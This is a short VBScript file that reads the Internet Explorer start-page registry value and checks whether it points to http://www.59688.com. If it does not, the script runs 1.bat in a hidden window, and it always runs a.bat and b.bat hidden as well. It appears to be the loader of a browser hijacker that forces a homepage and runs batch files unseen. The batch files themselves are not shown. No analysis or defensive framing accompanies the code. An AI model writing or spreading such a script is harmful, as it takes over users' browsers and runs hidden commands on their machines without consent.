Set ws = CreateObject("Wscript.Shell")
Set ws1 = CreateObject("Wscript.Shell")
Dim OperationRegistry 
Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
Dim data1,a9
Data1=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page") 

a9=left(Data1,len("http://www.59688.com"))

if a9="http://www.59688.com" then
else
ws.run "cmd /c 1.bat",vbhide
end if

ws1.run "cmd /c a.bat",vbhide
ws1.run "cmd /c b.bat",vbhide